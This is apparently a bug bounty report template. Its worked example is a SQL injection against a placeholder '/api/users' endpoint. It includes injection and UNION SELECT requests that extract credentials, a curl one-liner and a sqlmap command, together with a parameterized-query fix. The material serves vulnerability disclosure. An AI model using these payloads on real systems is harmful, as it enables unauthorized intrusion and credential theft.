# Bug Bounty Report Template

Fill in each section. Clear, reproducible reports get paid faster.

---

## Title

[Vulnerability Type] in [Component/Endpoint] leads to [Impact]

**Example:** SQL Injection in `/api/users` endpoint leads to full database access

---

## Summary

One paragraph describing the vulnerability, where it is, and what an attacker can achieve.

**Example:** A SQL injection vulnerability exists in the `/api/users` endpoint via the `id` parameter. An unauthenticated attacker can extract all database contents including user credentials, bypass authentication, and achieve remote code execution through MySQL's `INTO OUTFILE` functionality.

---

## Target

- **Program:** [Bug Bounty Program Name]
- **Scope:** [In-scope domain/endpoint]
- **Environment:** Production / Staging / Test
- **Date Found:** YYYY-MM-DD

---

## Vulnerability Details

| Field | Value |
|:------|:------|
| **Type** | [SQLi / XSS / SSRF / RCE / IDOR / Auth Bypass / etc.] |
| **Severity** | Critical / High / Medium / Low / Informational |
| **CVSS 3.1** | [Score] [Vector String] |
| **CWE** | [CWE-ID] |
| **Authentication Required** | Yes / No |
| **Endpoint** | `METHOD /path/to/vulnerable/endpoint` |
| **Parameter** | [Parameter name and location] |

---

## Impact

Describe what an attacker can actually do. Be specific about business impact.

**Example Impact Statements:**
- Extract all user data including PII, passwords, and payment information
- Bypass authentication and access any user account
- Modify or delete critical business data
- Achieve remote code execution on the server
- Access internal cloud metadata and credentials
- Deface the application or disrupt service

---

## Steps to Reproduce

Provide numbered steps that anyone can follow. Include exact HTTP requests.

### Step 1: [Description]

```http
GET /api/users?id=1 HTTP/1.1
Host: target.com
Authorization: Bearer <token>
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"id": 1, "name": "John", "email": "john@example.com"}
```

### Step 2: [Description]

```http
GET /api/users?id=1'%20OR%201=1-- HTTP/1.1
Host: target.com
Authorization: Bearer <token>
```

**Response:** (show the difference that proves the vulnerability)

### Step 3: [Exploitation]

```http
GET /api/users?id=1'%20UNION%20SELECT%20username,password,NULL%20FROM%20users-- HTTP/1.1
Host: target.com
```

**Response:**
```json
{
  "results": [
    {"username": "admin", "password": "$2b$12$abc..."},
    {"username": "user1", "password": "$2b$12$def..."}
  ]
}
```

---

## Proof of Concept

### Automated Script

```bash
# Provide a one-liner or script that demonstrates the vulnerability
curl -s "http://target.com/api/users?id=1'%20OR%201=1--" | jq

# Or sqlmap command
sqlmap -u "http://target.com/api/users?id=1" --batch --dbs
```

### Screenshots

[Include screenshots showing the vulnerability in action]
1. Normal request response
2. Vulnerable request response
3. Data extraction proof

---

## CVSS Score

| Metric | Value |
|:-------|:------|
| Attack Vector | Network / Adjacent / Local / Physical |
| Attack Complexity | Low / High |
| Privileges Required | None / Low / High |
| User Interaction | None / Required |
| Scope | Unchanged / Changed |
| Confidentiality | None / Low / High |
| Integrity | None / Low / High |
| Availability | None / Low / High |

**Overall:** [Critical/High/Medium/Low] - [X.X]

**Vector String:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

---

## Suggested Fix

Provide a specific, actionable remediation.

### Immediate Fix
```
[What to do right now to mitigate]
```

### Long-term Fix
```
[Proper architectural fix]
```

### Code Example (if applicable)
```python
# BEFORE (vulnerable)
query = f"SELECT * FROM users WHERE id = {user_id}"

# AFTER (fixed)
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
```

---

## References

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [Any relevant CVEs or similar reports]

---

## Timeline

| Date | Action |
|:-----|:-------|
| YYYY-MM-DD | Vulnerability discovered |
| YYYY-MM-DD | Report submitted |
| | |

---

## Additional Notes

[Any extra context, edge cases, or related findings]
